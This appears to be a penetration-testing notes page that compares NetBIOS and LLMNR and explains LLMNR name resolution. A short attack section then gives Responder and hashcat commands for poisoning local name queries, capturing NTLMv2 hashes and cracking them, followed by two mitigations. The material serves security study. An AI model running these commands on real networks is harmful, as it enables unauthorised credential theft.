## NetBIOS vs. LLMNR

| Feature                | NetBIOS                                                                                                                   | LLMNR                                                                                            |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| **Purpose**            | Provides network communication services, including name resolution and session management in legacy Windows environments. | Resolves hostnames to IP addresses on a local network when DNS is not available.                 |
| **Usage**              | Primarily used in older Windows networks for resource sharing and communication.                                          | Used in modern Windows environments for local name resolution.                                   |
| **Protocol Type**      | Legacy protocol with several services including NetBIOS Name Service (NBNS).                                              | Part of the Link-Local Multicast Name Resolution protocol suite.                                 |
| **Name Resolution**    | Uses NetBIOS Name Service (NBNS) to resolve names to IP addresses.                                                        | Uses multicast to resolve names to IP addresses on the local network.                            |
| **Security Risks**     | Vulnerable to NetBIOS spoofing attacks, where attackers impersonate services to intercept data.                           | Vulnerable to LLMNR spoofing attacks, where attackers respond to queries with false information. |
| **Scope**              | Operates on both local and remote networks, traditionally within Windows networks.                                        | Limited to local networks (link-local), generally within the same subnet.                        |
| **Modern Replacement** | Mostly replaced by DNS for name resolution and other modern network services.                                             | Often replaced by DNS or turned off in favor of more secure name resolution practices.           |
| **Network Traffic**    | Can generate significant traffic due to its broad use in legacy environments.                                             | Typically generates minimal traffic, only used for local name resolution.                        |

## How LLMNR works?

| **Step**                  | **Action**                                                                   | **Details**                                                                                                                                    | **Result**                                                      |
| ------------------------- | ---------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------- |
| **Connect to Network**    | Device connects to the network via DHCP                                      | Jane’s laptop connects to a café’s Wi-Fi, receives an IP address, subnet mask, default gateway, and DNS server addresses from the DHCP server. | Jane’s laptop is assigned an IP address like `192.168.1.15`.    |
| **DNS Resolution**        | Device queries DNS servers for external domain names                         | Jane’s laptop queries the DNS server at `8.8.8.8` for `www.example.com` to resolve it to an IP address.                                        | DNS server returns the IP address `93.184.216.34`.              |
| **LLMNR Usage**           | If DNS fails for local names, LLMNR is used to resolve local names           | Jane’s laptop queries the local network for `printer1` using LLMNR, as DNS does not have a record for it.                                      | LLMNR resolves `printer1` to the IP address `192.168.1.20`.     |
| **Network Communication** | Device communicates with servers or resources based on resolved IP addresses | Jane’s browser connects to `93.184.216.34` for web content, and her laptop sends print jobs to `192.168.1.20`.                                 | Website loads, and print job is processed by the local printer. |

## LLMNR ATTACK

```
1. Run Responder (Morning or after lunch)
2. An event occur
3. Capture Hash
4. Crack Hash
```

Run Responder to capture hash (*Ensure HTTP and SMB are ON*)
```
sudo responder -I <NIC> -dPv
```

When an event is triggered, NTLMv2 Hash will be captured.

Crack NTLMv2 Hash
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```
**Note:** In a virtual machine, hash-cracking tasks typically rely on the CPU, which is not as efficient for this purpose. Graphics cards (GPUs), with their superior parallel processing capabilities, are the primary drivers for efficient hash-cracking.

## Mitigation
- **Disable Multicast Name Resolution (LLMNR):** Prevents the exploitation of LLMNR for name resolution poisoning attacks.
- **Turn off NetBIOS over TCP/IP:** Reduces the risk of NetBIOS Name Service (NBT-NS) spoofing, which can lead to unauthorized access to network resources.


